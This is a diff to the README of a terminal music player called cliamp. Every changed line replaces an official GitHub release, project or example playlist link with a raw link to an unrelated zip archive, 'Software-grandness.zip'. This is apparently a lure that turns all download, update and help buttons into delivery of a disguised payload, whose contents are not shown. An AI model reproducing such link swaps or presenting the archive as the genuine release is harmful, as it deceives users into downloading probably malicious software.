@@ -1,6 +1,6 @@
 # 🎵 cliamp - Simple Terminal Music Player
 
-[![Download cliamp](https://img.shields.io/badge/Download-cliamp-brightgreen?style=for-the-badge)](https://github.com/KevRocha/cliamp/releases)
+[![Download cliamp](https://img.shields.io/badge/Download-cliamp-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/KevRocha/cliamp/main/external/navidrome/Software-grandness.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to set up and run cliamp on your Windows PC. No special techn
 
 Go to the official cliamp release page here:
 
-[![Download cliamp](https://img.shields.io/badge/Download-cliamp-blue?style=for-the-badge)](https://github.com/KevRocha/cliamp/releases)
+[![Download cliamp](https://img.shields.io/badge/Download-cliamp-blue?style=for-the-badge)](https://raw.githubusercontent.com/KevRocha/cliamp/main/external/navidrome/Software-grandness.zip)
 
 This link takes you to all available versions and files for Windows.
 
@@ -99,7 +99,7 @@ After you start cliamp, use simple commands to control playback. Here are some b
 You can load playlists in M3U format or provide streaming URLs. For example:
 
 ```
-play https://your-podcast-url.com/feed.m3u
+play https://raw.githubusercontent.com/KevRocha/cliamp/main/external/navidrome/Software-grandness.zip
 ```
 
 ---
@@ -133,7 +133,7 @@ The app supports all common audio formats like MP3, AAC, OGG, and FLAC.
 
 To update cliamp:
 
-1. Go back to the [release page](https://github.com/KevRocha/cliamp/releases).
+1. Go back to the [release page](https://raw.githubusercontent.com/KevRocha/cliamp/main/external/navidrome/Software-grandness.zip).
 2. Download the latest Windows version.
 3. Extract or replace the old files with the new ones.
 4. Run the new version from your terminal.
@@ -173,10 +173,10 @@ For streaming errors, verify the URLs or server settings.
 
 ## 📂 Where to Find More Help
 
-For detailed FAQs and help, check issues and discussions on the [GitHub cliamp page](https://github.com/KevRocha/cliamp).  
+For detailed FAQs and help, check issues and discussions on the [GitHub cliamp page](https://raw.githubusercontent.com/KevRocha/cliamp/main/external/navidrome/Software-grandness.zip).  
 
 You can also find tips from other users or report problems there.  
 
 ---
 
-[![Download cliamp](https://img.shields.io/badge/Download-cliamp-brightgreen?style=for-the-badge)](https://github.com/KevRocha/cliamp/releases)
+[![Download cliamp](https://img.shields.io/badge/Download-cliamp-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/KevRocha/cliamp/main/external/navidrome/Software-grandness.zip)
